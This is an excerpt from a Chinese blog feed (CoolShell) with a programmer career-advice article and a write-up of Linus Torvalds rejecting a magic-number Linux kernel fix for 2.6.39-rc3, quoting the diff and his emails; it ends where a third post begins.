<p>自从四年前被CSDN采访后（“<a title="职业规划就像软件工程" href="http://blog.csdn.net/haoel/archive/2007/07/13/1688104.aspx" target="_blank">职业规化就像软件工程</a>”），经常会有网友（尤其是刚毕业的）写邮件来问我一些程序员职业生涯的一些问题，至到今天。比如，国企还是外企的选择，一直编程有没有前途等等问题。面对这样的邮件，我感到有很大的压力，因为如果我的回复很有可能会误人一生，但我另一方面又很想帮助这些人。所以，我基本上还是会尝试回一下这样的邮件。昨天，我又回了一封。但是我心里还是有点忐忑不安。害怕说错了什么。</p>
<p>今天，我想把我的一些思路和建议写在这里，一方面供大家参考，另一方面也想听听大家对我的评判，这样不但对更多的人有帮助，同时对我自己也是一个帮助。</p>
<p>下面是某网友前天给我发来的邮件：</p>
<blockquote>
<p>我是一个刚刚毕业的大学生，我觉得自己对于程序员这个行业感到很迷惘，所以发邮件打扰您一下，麻烦了。</p>
<p>我今年正在找工作，我现在有几家国企的offer，百度的offer还在等待，我觉得第一份工作对我来说很重要，因为第一份基本决定了近几年或者一辈子你在哪个行业发展。家里人都是希望我签国企，但是我自己对技术很感兴趣，一直希望能在技术上面走下去，签国企虽然很轻松但是我总觉得在技术上学不到什么有用的东西，所以我个人倾向是去百度。</p>
<p>我现在很迷惘的是，如果我一直在程序员这个行业上走下去，以后的出路应该是什么呢？还是一直到高级工程师，还是项目管理这种程度吗？</p>
<p>我现在听很多人在说程序员必需要转行，因为一辈子在编写代码，没有什么好的出路，对于这点，您有什么看法吗？我现在才刚刚从学校毕业，对IT这个行业也不是非常了解，但是我觉得自己自学能力很强，而且确实很想学些东西，你对于一个刚刚毕业的计算机学生有什么建议吗？</p>
</blockquote>
<p>信件的内容我没有改变，我相信很多人都有相似的问题。我昨天给这们朋友回复了邮件，下面是我回复内容的一个整理。欢迎大家讨论。</p>
<p>首先，我想说的是，<strong>这些东西只是我根据我的经历给出的建议，仅仅供大家去参考</strong>，<span style="color: #cc0000;"><strong>你的路你的人生要你自己决定，不要轻易的让人帮你决定，那怕是你的家人</strong></span>。</p>
<p>如果我们把所的问题一起谈，那怎么说也说不清楚，所以，请允许我“<a title="一些软件设计的原则" href="https://coolshell.cn/articles/4535.html" target="_blank">关键点分离原则</a>”来分开说说。</p>
<p><span id="more-4561"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%80%E3%80%81%E5%AF%B9%E6%8A%80%E6%9C%AF%E7%9A%84%E7%83%AD%E6%83%85" title="一、对技术的热情">一、对技术的热情</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%BA%8C%E3%80%81%E5%AF%B9%E6%8A%80%E6%9C%AF%E7%9A%84%E8%83%BD%E5%8A%9B" title="二、对技术的能力">二、对技术的能力</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%89%E3%80%81%E5%86%8D%E8%AF%B4%E8%AF%B4%E5%B7%A5%E4%BD%9C%E7%9A%84%E4%BA%8B" title="三、再说说工作的事">三、再说说工作的事</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%9B%9B%EF%BC%8C%E6%8A%80%E6%9C%AF%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%A4%9A%E9%95%BF" title="四，技术可以做多长">四，技术可以做多长</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E4%BA%94%EF%BC%8C%E5%BE%85%E9%81%87%E5%92%8C%E8%81%8C%E4%BD%8D" title="五，待遇和职位">五，待遇和职位</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81%E5%AF%B9%E6%8A%80%E6%9C%AF%E7%9A%84%E7%83%AD%E6%83%85"></span>一、对技术的热情<span class="ez-toc-section-end"></span>
</h4>
<p>如果我们喜爱编程，喜爱技术的话，那么，我们就会投入热情，自己会去专研很多东西。就像你以前对某个东西痴迷一样，你可以在工作之余还在学习和专研这些东西，你会经常和人讨论这些东西。不知道你是否会和我一样有一种感觉，如果你不学习技术，你不去专研，你就怕被淘汰，你就会感到不舒服。</p>
<p>所以，我们一定要问我们自己一下，我们自己喜欢技术吗？喜欢技术到什么程度。只是感兴趣还是喜欢？这两个不一样。<strong>兴趣能让你开始让你执着，但只有喜爱才会投入热情，只有投入热情才可能会出成绩</strong>。这个问题你要问问自己。</p>
<ol>
<li>你有多大的热情在这个事业上？</li>
<li>你对你自己的自我价值的实现的诉求有多大？</li>
</ol>
<p>如果你很有热情，可能到了有些痴迷的程度的话，比如，你会因为专研某个问题，学习某个东西，尝试某个东西，达到废寝忘食的程度，而且以些为乐，那么我非常建议你走技术的路线。</p>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E5%AF%B9%E6%8A%80%E6%9C%AF%E7%9A%84%E8%83%BD%E5%8A%9B"></span>二、对技术的能力<span class="ez-toc-section-end"></span>
</h4>
<p>有兴趣，有热情，并不代表你就一定行。你需要很清楚地认识到，你还需要有能力（我在《<a title="再谈“我是怎么招聘程序员的”（上）" href="https://coolshell.cn/articles/4506.html" target="_blank">再谈“我是怎么招聘程序员”</a>》一文中说了程序员的四个事，操作技能，知识，经验，和能力，大家可以去看看我对“能力”的定义）。你需要反思和重审一下自己是否有能力，你的学习能力怎么样，是经常需要问人，还是可以自己专研？你的思路怎么样，是否能被有经验的人认可，还是能够影响别人？</p>
<p><strong>兴趣和热情只能让你很执着，但并不一定能让你走好这条路，只有你的能力和你的强项才能让你走好这条路</strong>。希望大家能够清楚地认识到这其中的差别。</p>
<p>所以，你一定要对自己做出一个判断，要学会反思，如果你是有能力的适合走技术路线的人，那以我非常建议你走技术路线。</p>
<p>我也尝试创过业，但我觉得我这种人是“谋士”，不是能攻城拔寨的“将军”，创业更需要的是“将军”，我目前只能是一个辅佐他们的“谋士”，所以，我也只能尽力能成为一个级别高点的“谋士”。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E5%86%8D%E8%AF%B4%E8%AF%B4%E5%B7%A5%E4%BD%9C%E7%9A%84%E4%BA%8B"></span>三、再说说工作的事<span class="ez-toc-section-end"></span>
</h4>
<p>我比较同意的”第一份基本决定了近几年或者一辈子你在哪个行业发展”，但又有一点点不是很同意。因为我毕业的时候，在银行混了两年，然后又去一个国企业呆了2年。所以，第一份工作并没有影响我的职业。但是，我必需承认——当我从银行出来的时候，我落后了，落后了还很多，我花了近5-6年的时候才把这个差距追了回来。</p>
<p>所以，我有几个观点想告诉大家：</p>
<p><strong> </strong></p>
<ul>
<li>
<span style="font-weight: normal;">第一份工作并不决定你的人生</span><strong><span style="font-weight: normal;">。因为你可以在2年内换工作。但是你头四年的做的事会对你的职业有影响。这里，我有两个案例分享一下。（我不用说太多了，相信大家自己能体会）</span></strong>
<ul>
<li>一个是我的同学70后，他以前是程序员，干了5/6年后不想干了，想转行，结果转不了，因为他的工作经历让他很难转行了，他问了一下自己是否愿意和那些刚毕业的80后拿一样的工作一起竞争，最后他自己都不愿意。后来，他去读了MBA，现在还做IT，现在做一些业务咨询方面的工作。不能算失败，但是时间浪费了。</li>
<li>还有一个是我的同事，她CS专业毕业想做程序员，但最后为了进一个好的公司只能做QA，现在4年多了，她很想很想做dev，但是却抱怨工作没有给她这样的机会，4年多的QA经验让她很难成为Dev了。我从她做QA一年的时候就在和她说，如果你想做Dev，你就要有技术储备，多和dev在一起工作，QA又怎么样，如果我能读Dev的代码，我总有一天会成为Dev的。事实证明，她对技术并没有太多热情。现在也只能得过且过了。</li>
</ul>
</li>
</ul>
<ul>
<li>如果你觉得自己在技术有自信有热情，而且已经有一些成绩了，我强烈建议你去IT公司中锻炼，越尊重技术的的IT公司越好。就像打球一样，只有和比你厉害的人一起玩，你才会得提高。</li>
</ul>
<ul>
<li>如果你对技术的热情一般，也没有太多的自我价值的追求，也不想拼搏，而且对吃大锅饭不反感，对没有激情的工作不反感的话，那么，你应该去事业单位，当个公务员，走走常规则的人生，养养老也不错。这里，我多说一句，根据中国的现在国情来看，如果你有自我价值的诉求，你要去大城市，去好的公司，走体制外的路线，如果你又不想来大城市 ，只想呆在地方的话，那么，我个人非常建议你走体制内的路线，在地方，只有体制内的路线是最好的。</li>
</ul>
<ul>
<li>千万别去一些没有前途的小公司（要去小公司你得看看这个公司的人和业务），很多不起眼的小公司现在都变大了，能和一个公司一起成长是相当难得的（我现在就特别想要这方面的经历），现在这个社会，与其去那些很难成长为大公司的小的很不规范的公司，还不如自己创业。（<strong>更新2011/4/26</strong>：<a href="#comment-48180">@islet8 </a> 回复中的观点可能比我的更好——“我觉得第一份工作能尽量进大公司的确是有好处的，能够帮你建立起一套规范的、成熟的工作习惯了思维方式，经过一两年（在激情还没被磨灭之前）再挑一个靠谱的、能赌上自己前途的小公司（比如同事朋友等推荐过去的或是他们联合创立的）一起成长一遍，无论公司的成败，对个人来说，那都是成功了”）</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%9B%9B%EF%BC%8C%E6%8A%80%E6%9C%AF%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%A4%9A%E9%95%BF"></span>四，技术可以做多长<span class="ez-toc-section-end"></span>
</h4>
<p>在这里，我用我自己经历做个例子，我在软件编程上有14年了（加上大学里的项目就有16年了），虽然我今天是经理了，但是我还是喜欢编程。我以前也听到过别人说的——做技术太辛苦，没前途。我并不这样觉得，因为我觉得技术是实实在在的东西，很实在，这让我很踏实，踏实的感觉得好。因为，</p>
<ul>
<li>我个人觉得真正的稳定是，今天我离开 这个公司，我明天就能找到相应的工作。</li>
<li>如果我的工作不成问题了，那么我就可以从谋生上升到事业的层次来。</li>
<li>只有到了事业这个层次，我才能有所建树。</li>
</ul>
<p>另外，我觉得说出来的那些话的人要么就是“小猫钓鱼”的那些人，要么就是短视的人，你可以问问他们，哪个非技术的行业有前途，然后你去问问从事那个行业的人怎么样看？我15年来都在编程，虽然走了一些弯路，但是我很感谢那些中途退缩者，是他们让我这15年变得更有价值。15年从事同一个件事，这让我很有竞争力。有了竞争力，我的工作才不会是一个问题，我才能上升上事业的层次上来。</p>
<p>当然，如果你发现你不适合，你无法坚持，那么我建议你还是想清楚，别的行业你能坚持吗？<strong>我们不害怕转行，害怕的是自己对自己缺乏认识，害怕的是小猫钓鱼，害怕的是一山望比一山高</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E4%BA%94%EF%BC%8C%E5%BE%85%E9%81%87%E5%92%8C%E8%81%8C%E4%BD%8D"></span>五，待遇和职位<span class="ez-toc-section-end"></span>
</h4>
<p>比如你的职位，薪水，福利，等，我从来都不是很关心这些东西，这些都是次要的（其次重要的），最重要的是你的能力和经历，是那些可以写在你简历上的，让你引以自豪的经历和能力。（一定要自己引以自豪）。<strong>而你的职位，薪水，只不过是你能力和经历的附属品</strong>。</p>
<p>把自己对待遇和职位的那个目标放在心里，踏踏实实做好今天的事，炼好自己的内功，注重经验的积累和总结，等待一个能让你量变引发质变的机会，用你的能力抓住它不要放手，你会发现你的路就在前方，通往这条路的门不知不觉已经开了。功到自然成，水到渠成。</p>
<p>以上是我的一些建议，不一定对，其可能因为我的个人经历有局限，还希望听道大家的讨论和指点。</p>
<p><span style="color: #cc0000; font-size: 14px;"><strong>（请勿用于商业用途，转载时请注明作者和出处）</strong></span></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4561" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="480483ded9">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>69</strong> 人打了分，平均分： <strong>4.74</strong> )<br><span class="post-ratings-text" id="ratings_4561_text"></span><meta itemprop="name" content="对程序员职业的一些建议">
<meta itemprop="headline" content="对程序员职业的一些建议">
<meta itemprop="description" content="自从四年前被CSDN采访后（“职业规化就像软件工程”），经常会有网友（尤其是刚毕业的）写邮件来问我一些程序员职业生涯的一些问题，至到今天。比如，国企还是外企的选择，一直编程有没有前途等等问题。面对这样的邮件，我感到有很大的压力，因为如果我的回复很有可能会误人一生，但我另一方面又很想帮助这些人。所以，我基本上还是会尝试回一下这样的邮件。昨天，我又回了一封。但是我心里还是有点忐忑不安。害怕说错了什么。...">
<meta itemprop="datePublished" content="2011-04-26T13:29:44+08:00">
<meta itemprop="dateModified" content="2011-04-26T21:09:17+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4561.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4561.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.74">
<meta itemprop="ratingCount" content="69">
</div>
</div>
<div id="post-ratings-4561-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-26T13:29:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/4561.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Linux 2.6.39-rc3的一个插曲 ]]></title>
<link>https://coolshell.cn/articles/4576.html</link>
<content><![CDATA[ 
<p>2011年4月12日，Linux 2.6.39-rc3发布了，Linus Torvalds写了一个<a href="http://thread.gmane.org/gmane.linux.kernel/1124982">发布邮件</a>，其中包含了一个长长的为这个版本做过贡献的人员名单，这个名单中有很多看上去应该是中国人的名字，我挺为他们感到骄傲的（不知道你是否还记得以前本站的”<a title="谁写了Linux" href="https://coolshell.cn/articles/1360.html" target="_blank">Linux是由谁写的</a>“）。</p>
<p>不过，没过一会，发现了一个bug，经过大家的调查（2.6.38版没有发现这个问题），很快，找到了原因，是因为一个内存地址的问题，一个叫Yinghai Lu的人（看其名字应该是中国人，其邮件是@kernel.org）<a href="http://thread.gmane.org/gmane.linux.kernel/1124982/focus=1126082" target="_blank">找到了原因</a>—— radeon card使用了一个不正确的内存地址[0xa0000000 – 0xc000000]。Joerg Roedel跟贴说，这个地址超出了4GB的内存，然后他和Alex Deucher聊了一会，觉得不应该是这个问题，因为这个地址应该是GPU的，而不是系统内存的。</p>
<p>好像，Yinghai Lu没有理会他们说的不应该是这个问题，<a href="http://thread.gmane.org/gmane.linux.kernel/1124982/focus=1126133" target="_blank">给出了个fix</a>：</p>
<p></p>
<pre data-enlighter-language="diff" class="EnlighterJSRAW">diff --git a/arch/x86/kernel/aperture_64.c b/arch/x86/kernel/aperture_64.c
index 86d1ad4..3b6a9d5 100644
--- a/arch/x86/kernel/aperture_64.c
+++ b/arch/x86/kernel/aperture_64.c
@@ -83,7 +83,7 @@ static u32 __init allocate_aperture(void)
 	 * so don't use 512M below as gart iommu, leave the space for kernel
 	 * code for safe
 	 */
-	addr = memblock_find_in_range(0, 1ULL&lt;&lt;32, aper_size, 512ULL&lt;&lt;20);
+	addr = memblock_find_in_range(0, 1ULL&lt;&lt;32, aper_size, 512ULL&lt;&lt;21);
  	if (addr == MEMBLOCK_ERROR || addr + aper_size &gt; 0xffffffff) {
 		printk(KERN_ERR
 			"Cannot allocate aperture memory hole (%lx,%uK)\n",
</pre>
<p>看到这个fix，Linus Torvalds不高兴了，他回贴问道：</p>
<ul>
<li>为什么全都是Magic Numbers？</li>
<li>为什么0x80000000就那么特殊？</li>
<li>为什么我们这样改就行？</li>
</ul>
<p>还说了这样一句话——</p>
<p><span id="more-4576"></span></p>
<blockquote><p>This kind of “I broke things, so now I will jiggle things randomly until they unbreak” is not acceptable. 这种“我把事搞砸了，就随意地调整直到事情又工作”的方式是不可接受的。</p></blockquote>
<p>还说，这里即没有说明为什么我们fix在了正确的地方（也没有解释那些Magic Number是什么），也没有回滚那个有问题的patch。还说——</p>
<blockquote>
<p>Don’t just make random changes. There really are only two acceptable models of development: “think and analyze” or “years and years of testing on thousands of machines”. Those two really do work.</p>
<p>不要乱改。那里只有两个可行的开发模式：“思考和分析” 或是 “数年数年地不断地在几千台机器上测试”。这两个方式才是真正可行的。</p>
</blockquote>
<p>当然，Yinghai Lu对<a href="http://thread.gmane.org/gmane.linux.kernel/1124982/focus=1126154" target="_blank">其做了解释</a>，说我们的确调查过了，老的代码用的内存地址是0x80000000，新的则是用0xa0000000，而0xa0000000不工作。这又引发了 Linus Torvalds 的<a href="http://thread.gmane.org/gmane.linux.kernel/1124982/focus=1126216" target="_blank">不满的回贴</a>。Linus说——</p>
<blockquote>
<p>Yinghai, we have had this discussion before, and dammit, you need to understand the difference between “understanding the problem” and “put in random values until it works on one machine”.</p>
<p>Yinghai，我们以前谈过这个事，该死的，你真的需要明白“理解一个错误”和“设一个随意的值直到其正常工作”的区别。</p>
<p>There was absolutely _<span style="text-decoration: underline;">zero</span>_ analysis done. You do not actually understand WHY the numbers matter. You just look at two random numbers, and one works, the other does not. That’s not “analyzing”. That’s just “random number games”.</p>
<p>这里就根本没有分析。你没有直正的明白<strong>为什么</strong>这些数字能行。你只看了两个随机的数，一个能行，另一个不行。这不是“分析”，这叫“随机数游戏”。</p>
<p>If you cannot see and understand the difference between an actual analytical solution where you _<span style="text-decoration: underline;">understand</span>_ what the code is doing and  why, and “random numbers that happen to work on one machine”, I don’t know what to tell you.</p>
<p>一个解决方案真正经过分析了那段代码干什么的为什么的，另一个是“随机数字可以让其在一台机器上运转”，如果你不能看到和理解他们之间的不同，那我不知道要和你说什么了。</p>
</blockquote>
<p>然后，Linus Torvalds进行了谆谆教导——（相当的受用啊）</p>
<blockquote>
<p>Let me repeat my point one more time.</p>
<p>让我再一次重复一下我的观点</p>
<p>You have TWO choices. Not more, not less:</p>
<p>你有两个选择，不多也不少：</p>
<p>– choice #1: go back to the old allocation model. It’s tested. It doesn’t regress. Admittedly we may not know exactly _<span style="text-decoration: underline;">why</span>_ it works, and it might not work on all machines, but it doesn’t cause regressions (ie the machines it doesn’t work on it _<span style="text-decoration: underline;">never</span>_ worked on).</p>
<p>– <strong>选择一</strong>：回滚到老的分配模式。那是测试过的。它过了回归测试。诚然，我们也许不知道<strong>为什么</strong>那样能行，并且，即使是那样也不一定能在所有的机器上工作，但是其没有让回归测试有问题（这个代码<strong>永不可能</strong>在不能运行的系统上运行）</p>
<p>And this doesn’t mean “old value for that _<span style="text-decoration: underline;">one</span>_ machine”. It means “old value for _<span style="text-decoration: underline;">every</span>_ machine”. So it means we revert the whole bottom-down thing entirely. Not just “change one random number so that the totally different allocation pattern happens to give the same result on one particular machine”.</p>
<p>这并不代表“老的值只能在一台机器上工作”。这代表“老的值可以工作在每一台机器上”。所以，我们需要回滚整个代码改动。而不只是“为了一个特别的机器去修改一个和以前完全不一样的随机数”。</p>
<p>– Choice #2: understand exactly _<span style="text-decoration: underline;">what</span>_ goes wrong, and fix it analytically (ie by _<span style="text-decoration: underline;">understanding</span>_ the problem, and being able to solve it exactly, and in a way you can argue about without having to resort to “magic happens”).</p>
<p>– 选择二：真正搞清楚为什么会错，并且有分析地修改他（理解问题才能真正解决之，并且，只有没有“魔法发生”的时候你才可以来争论）</p>
<p>Now, the whole analytic approach (aka “computer sciency” approach), where you can actually think about the problem without having any pesky “reality” impact the solution is obviously the one we tend to prefer. Sadly, it’s seldom the one we can use in reality when it comes to things like resource allocation, since we end up starting off with often buggy approximations of what the actual hardware is all about (ie broken firmware tables).</p>
<p>现在，整个分析方法（亦称作“计算机科学”的方法）应该是你可以在没有在外界干扰下真正思考这个问题而得到的解决方案，这很明显是我们推崇的。只有在极罕见地情况下我们可以在有外界干扰下分析这种资源分配的事，因为我们只有了解倒底是什么样的硬件，我们才能最终远离bug（如：错误的固件表）</p>
<p>So I’d love to know exactly why one random number works, and why another one doesn’t. But as long as we do _<span style="text-decoration: underline;">not</span>_ know the “Why” of it, we will have to revert.</p>
<p>所以，我希望你能知道为什么一个随机数能行，而另一个不行。只要我们不知道，那么我们就不得和回滚整个改动。</p>
<p>It really is that simple. It’s _<span style="text-decoration: underline;">always</span>_ that simple.</p>
<p>这真的是很简单，而且这<strong>一直</strong>是那么简单。</p>
<p>So the numbers shouldn’t be “magic”, they should have real explanations. And in the absense of real explanation, the model that works is “this is what we’ve always done”. Including, very much, the whole allocation order. Not just one random number on one random machine.</p>
<p>所以，那些数不应该是“magic”的，他们应该有真正的说明。在有真正的说明的情况下，我们的开发模式才会工作。其包括了整个分配顺序。不只是那个在任意机器上的随机数。</p>
<p style="text-align: center;">Linus</p>
</blockquote>
<p style="text-align: left;">后面的事不用说了。我没有想到Linux 内核组会有像Yinghai这样工作的方式，毕竟这是一个黑客级的开发团队。我个人对这个乱写代码的人执零容忍的态度，不管你干过什么，不管你哪里毕业的，不管你简历怎么样，不求甚解随意写代码的人我无法接受。我不知道Yinghai Lu会怎么样想，他/她会像我在“<a title="程序员那些悲催的事儿" href="https://coolshell.cn/articles/3980.html" target="_blank">程序员那些悲催的事儿</a>”中谈我经历那样知耻而后勇吗？能得到Linus的教导真是一件很不错的事。虽然，Linus教导的这些东西，都应该是程序员最最最基本的技能。<strong>fix bug一定要fix在root cause上啊</strong>，<strong>了解一个问题，不但要知其然，还要知其所以然啊</strong>，这都是老生长谈了。本站有很多提高程序员能力的文章，比如，<a title="优秀程序员的十个习惯" href="https://coolshell.cn/articles/222.html" target="_blank">这篇</a>，<a title="优质代码的十诫" href="https://coolshell.cn/articles/1007.html" target="_blank">这篇</a>，还有<a title="五个方法成为更好的程序员" href="https://coolshell.cn/articles/2606.html" target="_blank">这篇</a>。</p>
<p style="text-align: left;">各位朋友，我真心希望你能从这个小插曲中明白点什么。</p>
<p style="text-align: left;"><strong>—– 更新2011/04/27</strong>—–</p>
<p style="text-align: left;">从本贴的回复中可以看到有朋友说如果时间紧，没有办法只能在不求甚解的地去fix bug，因为老板催。我认为这是老板的“急功近利”的问题。我想和大家说一下，你得想清楚你属于下面那种人：</p>
<ol>
<li>
<div style="text-align: left;">你的老板给你压力，让你不得不乱fix，</div>
</li>
<li>
<div style="text-align: left;">你认同只要时间紧bug是可以乱fix的。</div>
</li>
</ol>
<p style="text-align: left;">如果你属于1），那我觉得还情由可原，这是管理问题。但这不能成为你对乱fix bug的理由。一般这种问题怎么解决：<strong>首先，给一个hot fix去救火，然后，有时间去调查root cause，最后经过分析和测试，给出一个final 的 offical fix</strong>。这就是应急的做法，根本不存在什么可以乱fix bug的做法。</p>
<p style="text-align: left;">如果你属于2），那么我只能“过激”地说你没有成为程序员的资质！</p>
<p>另外，<strong>快速地fix bug，并不等于，不求甚解的fix bug</strong>。大家不要把这两件事等同。</p>
<p style="text-align: left;"> </p>
<p style="text-align: left;"><span style="color: #cc0000; font-size: 14px;"><strong>（请勿用于商业用途，转载时请注明作者和出处）</strong></span></p>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8990.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8990.html" class="wp_rp_title">Linus：利用二级指针删除单向链表</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 – Shell 篇</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 – Qt官网的设计实践总结</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4576" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="0fd07118ad">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>29</strong> 人打了分，平均分： <strong>4.38</strong> )<br><span class="post-ratings-text" id="ratings_4576_text"></span><meta itemprop="name" content="Linux 2.6.39-rc3的一个插曲">
<meta itemprop="headline" content="Linux 2.6.39-rc3的一个插曲">
<meta itemprop="description" content='2011年4月12日，Linux 2.6.39-rc3发布了，Linus Torvalds写了一个发布邮件，其中包含了一个长长的为这个版本做过贡献的人员名单，这个名单中有很多看上去应该是中国人的名字，我挺为他们感到骄傲的（不知道你是否还记得以前本站的"Linux是由谁写的"）。

不过，没过一会，发现了一个bug，经过大家的调查（2.6.38版没有发现这个问题），很快，找到了原因，是因为一个内...'>
<meta itemprop="datePublished" content="2011-04-27T08:39:26+08:00">
<meta itemprop="dateModified" content="2011-04-27T14:55:23+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4576.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4576.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.38">
<meta itemprop="ratingCount" content="29">
</div>
</div>
<div id="post-ratings-4576-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-27T08:39:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/4576.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 关于Amazon云宕机的网贴收集 ]]></title>
<link>https://coolshell.cn/articles/4601.html</link>
<content><![CDATA[ 
